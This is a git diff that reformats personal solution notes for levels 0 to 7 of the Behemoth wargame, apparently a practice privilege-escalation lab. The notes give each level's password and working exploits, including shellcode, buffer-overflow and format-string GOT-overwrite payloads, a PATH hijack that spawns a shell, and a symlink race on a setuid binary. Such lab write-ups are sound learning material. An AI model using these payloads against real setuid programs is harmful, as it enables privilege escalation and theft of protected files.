@@ -1,4 +1,5 @@
-############################################ Behemoth #############################################
+
+――――――――――――――――――――――――――――――――――――――――――――[ Behemoth ]――――――――――――――――――――――――――――――――――――――――――――
 
 Level:    0
 Exlpoit:  ltrace
@@ -7,8 +8,7 @@ Password: 8YpAQCAuKf
 * Using ltrace shows that the program calls strcmp on the user input password and the 
   actual password for the file.
 
-
-###################################################################################################
+――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――
 
 Level:    1
 Exploit:  Buffer Overflow
@@ -55,29 +55,28 @@ export SHELLCODE=$(perl -e 'print "\x90"x20 . "\xeb\x11\x5e\x31\xc9\xb1\x21\x80\
 
 (perl -e 'print "\x90"x71 . "\xb1\xd5\xff\xff"';cat) | ./behemoth1
 
-###################################################################################################
+――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――
 
 Level:    2
 Exploit:  Path Priviledge Escalation
 Password: JQ6tZGqt0i
 
-* ltrace shows that permissions are elavated and there is a system() cmd without a 
-  full path <touch>
-* Creating a file with the same name as the cmd <touch> will execute our bash cmd 
-* Need to add the current directory to the path so that the file will be found and 
-  executed first over the actual path to the cmd <touch>
+ltrace shows that permissions are elavated and there is a system() cmd without a full path <touch>
+Creating a file with the same name as the cmd <touch> will execute our bash cmd 
+Need to add the current directory to the path so that the file will be found and executed first over
+the actual path to the cmd <touch>
 
 echo "/bin/bash" > touch
 chmod 777 touch
 export PATH=.:$PATH
 
-###################################################################################################
+――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――
 
 Level:    3
 Exploit:  Format String Vulnerability
 Password: hpjUdlG723
 
-* Overwrite function addr in the GOT (Binary Exploitation)
+Overwrite function addr in the GOT (Binary Exploitation)
 
 $ objdump -d behemoth3          // static disassembly of ELF
     call fgets                  // input for format string
@@ -87,65 +86,68 @@ $ objdump -d behemoth3          // static disassembly of ELF
 $ objdump -R behemoth3          // Gets relocatable entries (libs)
     0804b218  puts@GLIBC_2.0    // puts() GOT entry is stored at 0x0804b128
 
-* we want to overwrite 0x0804b218 -> shellcode address
+we want to overwrite 0x0804b218 -> shellcode address
 
-export SHELLCODE=$(perl -e 'print "\x90"x20 . "\xeb\x11\x5e\x31\xc9\xb1\x21\x80\x6c\x0e\xff\x01\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x6b\x0c\x59\x9a\x53\x67\x69\x2e\x71\x8a\xe2\x53\x6b\x69\x69\x30\x63\x62\x74\x69\x30\x63\x6a\x6f\x8a\xe4\x53\x52\x54\x8a\xe2\xce\x81"')
+$ export SHELLCODE=$(perl -e 'print "\x90"x20 . "\xeb\x11\x5e\x31\xc9\xb1\x21\x80\x6c\x0e\xff\x01\x80
+  \xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x6b\x0c\x59\x9a\x53\x67\x69\x2e\x71\x8a\xe2\x53\x6b
+  \x69\x69\x30\x63\x62\x74\x69\x30\x63\x6a\x6f\x8a\xe4\x53\x52\x54\x8a\xe2\xce\x81"')
 
-#include <stdio.h>
-#include <stdlib.h>
-#include <string.h>
+  #include <stdio.h>
+  #include <stdlib.h>
+  #include <string.h>
 
-int main(int argc, char *argv[]) {
-	char *ptr;
+  int main(int argc, char *argv[]) {
+    char *ptr;
 
-	if(argc < 3) {
-		printf("Usage: %s <environment variable> <target program name>\n", argv[0]);
-		exit(0);
-	}
-	ptr = getenv(argv[1]); /* get env var location */
-	ptr += (strlen(argv[0]) - strlen(argv[2]))*2; /* adjust for program name */
-	printf("%s will be at %p\n", argv[1], ptr);
-}
+    if(argc < 3) {
+      printf("Usage: %s <environment variable> <target program name>\n", argv[0]);
+      exit(0);
+    }
+    ptr = getenv(argv[1]); /* get env var location */
+    ptr += (strlen(argv[0]) - strlen(argv[2]))*2; /* adjust for program name */
+    printf("%s will be at %p\n", argv[1], ptr);
+  }
 
 environment variable location:  0xffffd58b
 puts GOT entry:                 0x0804b218
 
-* Creating the Format string
+Creating the Format string
 perl -e 'print "AAAA\x18\xb2\x04\x08" . "%131x%n"'
               8 + 131 = 139 = 0x8b
 perl -e 'print "AAAA\x18\xb2\x04\x08AAAA\x19\xb2\x04\x08" . "%123x%n%90x%n"'
           8 + 8 + 123 = 139 + 74 = 213 = 0xd5
 perl -e 'print "AAAA\x18\xb2\x04\x08AAAA\x19\xb2\x04\x08AAAA\x1a\xb2\x04\x08" . "%115x%n%74x%n%42x%n"'            
       8 + 8 + 8 + 115 = 139 + 74 = 213 + 42 = 255 = 0xff
-perl -e 'print "AAAA\x18\xb2\x04\x08AAAA\x19\xb2\x04\x08AAAA\x1a\xb2\x04\x08AAAA\x1b\xb2\x04\x08" . "%107x%n%74x%n%42x%n%256x%n"'
+perl -e 'print "AAAA\x18\xb2\x04\x08AAAA\x19\xb2\x04\x08AAAA\x1a\xb2\x04\x08AAAA\x1b\xb2\x04\x08" .
+  "%107x%n%74x%n%42x%n%256x%n"'
   8 + 8 + 8 + 8 + 107 = 139 + 74 = 213 + 42 = 255 + 256 = 0x1ff
 
-###################################################################################################
+――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――
 
 Level:    4
 Exploit:  Symbolic Link, Pausing Processes
 Password: mVfC4rBKZ4
 
-* The proc gets its own PID and then attempts to open and read a file /tmp/$PID.
-  Because setuid, we can symbolic link /tmp/$PID to behemoth5 password file. 
-  When running the process, get the PID and then immediately pause it. create the file
-  and then continue with execution so that the program writes the password
+The proc gets its own PID and then attempts to open and read a file /tmp/$PID.
+Because setuid, we can symbolic link /tmp/$PID to behemoth5 password file. 
+When running the process, get the PID and then immediately pause it. create the file and then 
+continue with execution so that the program writes the password
 
 /behemoth4& PID=$!; kill -STOP $PID; ln -s /etc/behemoth_pass/behemoth5 /tmp/$PID; kill -CONT $PID
 
-###################################################################################################
+――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――
 
-Level 5
+Level:    5
 Exploit: 
-password = j9I1wHzfVC
+Password: j9I1wHzfVC
 
-###################################################################################################
+――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――
 
-Level 6
+Level:    6
 Exploit:
-password = sV17oOQTKc
+Password: sV17oOQTKc
 
-###################################################################################################
+――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――
 
 Level:    7
 Exploit:  Buffer Overflow
@@ -161,9 +163,9 @@ $(perl -e 'print "\x90"x528 . "B"x4')
 $(perl -e 'print "A"x528 . "B"x4 . "\x90" x100')
   placing shellcode at the end is not checked
 
-./behemoth7 $(perl -e 'print "A"x528 . "\x2c\xd0\xff\xff"x4 . "\x90"x100 .
-"\xeb\x11\x5e\x31\xc9\xb1\x21\x80\x6c\x0e\xff\x01\x80\xe9\x01\x75\xf6\xeb\x05
-\xe8\xea\xff\xff\xff\x6b\x0c\x59\x9a\x53\x67\x69\x2e\x71\x8a\xe2\x53\x6b\x69
-\x69\x30\x63\x62\x74\x69\x30\x63\x6a\x6f\x8a\xe4\x53\x52\x54\x8a\xe2\xce\x81"')
+$ ./behemoth7 $(perl -e 'print "A"x528 . "\x2c\xd0\xff\xff"x4 . "\x90"x100 . "\xeb\x11\x5e\x31\xc9
+  \xb1\x21\x80\x6c\x0e\xff\x01\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x6b\x0c\x59\x9a\x53
+  \x67\x69\x2e\x71\x8a\xe2\x53\x6b\x69\x69\x30\x63\x62\x74\x69\x30\x63\x6a\x6f\x8a\xe4\x53\x52\x54
+  \x8a\xe2\xce\x81"')
 
-
+――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――
